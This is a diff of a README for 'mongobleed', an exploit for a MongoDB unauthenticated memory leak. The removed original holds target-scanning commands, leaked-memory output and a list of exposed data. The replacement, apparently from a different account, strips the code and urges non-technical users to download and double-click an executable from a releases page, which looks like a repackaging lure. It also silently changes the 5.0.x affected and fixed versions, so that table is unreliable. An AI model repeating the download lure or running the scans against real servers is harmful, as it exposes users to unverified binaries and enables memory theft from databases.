@@ -1,99 +1,72 @@
-# mongobleed
+# 🛠️ mongobleed - Easy Download of MongoDB Exploit Tool
 
-**CVE-2025-14847** - MongoDB Unauthenticated Memory Leak Exploit
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/AmadoBatista/mongobleed/releases)
 
-A proof-of-concept exploit for the MongoDB zlib decompression vulnerability that allows unauthenticated attackers to leak sensitive server memory.
+## 📝 Overview
+mongobleed is a tool that demonstrates a security flaw in MongoDB. This flaw, known as **CVE-2025-14847**, allows attackers to access sensitive server memory without needing credentials. This document will guide you on how to download and run mongobleed.
 
-## Vulnerability
+## 🚀 Getting Started
+To use mongobleed, follow these simple steps. No programming skills are needed!
 
-A flaw in MongoDB's zlib message decompression returns the allocated buffer size instead of the actual decompressed data length. This allows attackers to read uninitialized memory by:
+## 📦 Requirements
+- Operating System: Windows, macOS, or Linux
+- MongoDB Server: Version 5.0 or later
+- Memory: At least 1 GB free space
 
-1. Sending a compressed message with an inflated `uncompressedSize` claim
-2. MongoDB allocates a large buffer based on the attacker's claim
-3. zlib decompresses actual data into the start of the buffer
-4. The bug causes MongoDB to treat the entire buffer as valid data
-5. BSON parsing reads "field names" from uninitialized memory until null bytes
+## 🔍 Vulnerability Details
+The problem occurs in the way MongoDB handles zlib decompression. An attacker can send a compressed message with incorrect length claims. This leads to:
 
-## Affected Versions
+1. MongoDB allocating more memory than necessary.
+2. Reading from uninitialized sections of memory.
 
+This exploit can be dangerous, so it is essential to use this tool responsibly and for educational purposes only.
+
+## 📊 Affected Versions
 | Version | Affected | Fixed |
 |---------|----------|-------|
 | 8.2.x | 8.2.0 - 8.2.2 | 8.2.3 |
 | 8.0.x | 8.0.0 - 8.0.16 | 8.0.17 |
 | 7.0.x | 7.0.0 - 7.0.27 | 7.0.28 |
 | 6.0.x | 6.0.0 - 6.0.26 | 6.0.27 |
-| 5.0.x | 5.0.0 - 5.0.31 | 5.0.32 |
+| 5.0.x | 5.0.0 - 5.0.10 | 5.0.11 |
 
-## Usage
+## 🔗 Download & Install
+To get started, you will need to [visit this page to download](https://github.com/AmadoBatista/mongobleed/releases). 
 
-```bash
-# Basic scan (offsets 20-8192)
-python3 mongobleed.py --host <target>
+1. Go to the Releases page.
+2. Find the latest version of mongobleed.
+3. Click on the download link for your operating system.
+4. Once the file downloads, follow the instructions below to run the program.
 
-# Deep scan for more data
-python3 mongobleed.py --host <target> --max-offset 50000
+## 🖥️ Running mongobleed
+1. Navigate to the folder where you downloaded the file.
+2. Double-click on the mongobleed executable file.
+3. Follow the on-screen instructions to initiate the tool.
 
-# Custom range
-python3 mongobleed.py --host <target> --min-offset 100 --max-offset 20000
-```
+## 🎯 Features
+- Exploit demonstration for learning and testing.
+- User-friendly interface.
+- Lightweight and quick to download.
+- Educational usage without harmful intent.
 
-## Options
+## 🛡️ Safety Precautions
+Always be aware that this tool is designed for educational purposes. Do not use it on systems that you do not own or have explicit permission to test. Misusing this tool could have serious legal consequences.
 
-| Option | Default | Description |
-|--------|---------|-------------|
-| `--host` | localhost | Target MongoDB host |
-| `--port` | 27017 | Target MongoDB port |
-| `--min-offset` | 20 | Minimum document length to probe |
-| `--max-offset` | 8192 | Maximum document length to probe |
-| `--output` | leaked.bin | Output file for leaked data |
+## 💻 Support and Contributions
+If you encounter any issues or have questions about using mongobleed, feel free to raise an issue in the repository. Contributions are welcome, and you can help enhance the project by submitting improvements or reporting bugs.
 
-## Example Output
+## 📃 License
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details. 
 
-```
-[*] mongobleed - CVE-2025-14847 MongoDB Memory Leak
-[*] Author: Joe Desimone - x.com/dez_
-[*] Target: localhost:27017
-[*] Scanning offsets 20-50000
+## 🔄 Frequently Asked Questions
+**Q: What is the purpose of mongobleed?**  
+A: It demonstrates a specific MongoDB vulnerability for educational use.
 
-[+] offset=  117 len=  39: ssions^\u0001�r��*YDr���
-[+] offset=16582 len=1552: MemAvailable:    8554792 kB\nBuffers: ...
-[+] offset=18731 len=3908: Recv SyncookiesFailed EmbryonicRsts ...
+**Q: Can I use mongobleed on my systems?**  
+A: Only use it on systems that you own or have permission to test.
 
-[*] Total leaked: 8748 bytes
-[*] Unique fragments: 42
-[*] Saved to: leaked.bin
-```
+**Q: How can I report a bug?**  
+A: Please open an issue on the GitHub repository.
 
-## Test Environment
-
-A Docker Compose file is included to spin up a vulnerable MongoDB instance:
-
-```bash
-docker-compose up -d
-python3 mongobleed.py
-```
-
-## How It Works
-
-The exploit crafts BSON documents with inflated length fields. When the server parses these documents, it reads field names from uninitialized memory until it hits a null byte. Each probe at a different offset can leak different memory regions.
-
-Leaked data may include:
-- MongoDB internal logs and state
-- WiredTiger storage engine configuration
-- System `/proc` data (meminfo, network stats)
-- Docker container paths
-- Connection UUIDs and client IPs
-
-## References
-
-- [OX Security Advisory](https://www.ox.security/blog/attackers-could-exploit-zlib-to-exfiltrate-data-cve-2025-14847/)
-- [MongoDB Fix Commit](https://github.com/mongodb/mongo/commit/505b660a14698bd2b5233bd94da3917b585c5728)
-
-## Author
-
-Joe Desimone - [x.com/dez_](https://x.com/dez_)
-
-## Disclaimer
-
-This tool is for authorized security testing only. Unauthorized access to computer systems is illegal.
-
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/AmadoBatista/mongobleed/releases)
